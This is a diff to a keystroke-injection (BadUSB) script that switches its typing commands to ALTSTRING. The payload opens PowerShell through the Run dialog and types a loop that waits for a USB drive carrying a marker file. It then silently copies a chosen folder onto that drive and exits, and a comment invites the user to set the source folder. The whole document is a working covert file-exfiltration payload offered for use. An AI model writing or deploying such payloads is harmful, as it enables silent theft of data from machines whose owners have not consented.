@@ -22,47 +22,45 @@ REM and change the value of $CopyFrom, $CopyTo and $FindMe below accordingly.
 DELAY 1000
 GUI r
 DELAY 1000
-STRING powershell
+ALTSTRING powershell
 ENTER
 DELAY 2000
 ENTER
-ALTCODE $CopyFrom = "C:\Windows"
+ALTSTRING $CopyFrom = "C:\Windows"
 ENTER
-ALTCODE $CopyTo = "copy"
+ALTSTRING $CopyTo = "copy"
 ENTER
-ALTCODE $FindMe = "gfhnubkw.txt"
+ALTSTRING $FindMe = "gfhnubkw.txt"
 ENTER
+ALTSTRING $f = $false
 ENTER
-STRING $f = $false
+ALTSTRING Cls
 ENTER
-STRING Cls
+ALTSTRING while (-not $f) {
 ENTER
-STRING while (-not $f) {
+ALTSTRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
 ENTER
-STRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
+ALTSTRING foreach ($e in $d) {
 ENTER
-STRING foreach ($e in $d) {
+ALTSTRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
 ENTER
-STRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
+ALTSTRING if (Test-Path $p) {
 ENTER
-STRING if (Test-Path $p) {
+ALTSTRING $f = $true
 ENTER
-STRING $f = $true
+ALTSTRING Write-Host "Copying..."
 ENTER
-ALTCODE Write-Host "Copying..."
+ALTSTRING $Destination = "$($e.Name)\$CopyTo"
 ENTER
-ALTCODE $Destination = "$($e.Name)\$CopyTo"
+ALTSTRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue ; Exit
 ENTER
-STRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue ; Exit
+ALTSTRING }
 ENTER
-STRING }
+ALTSTRING break
 ENTER
-STRING break
+ALTSTRING }
 ENTER
-STRING }
+ALTSTRING }
 ENTER
-STRING }
+ALTSTRING Exit
 ENTER
-STRING Exit
-ENTER
-
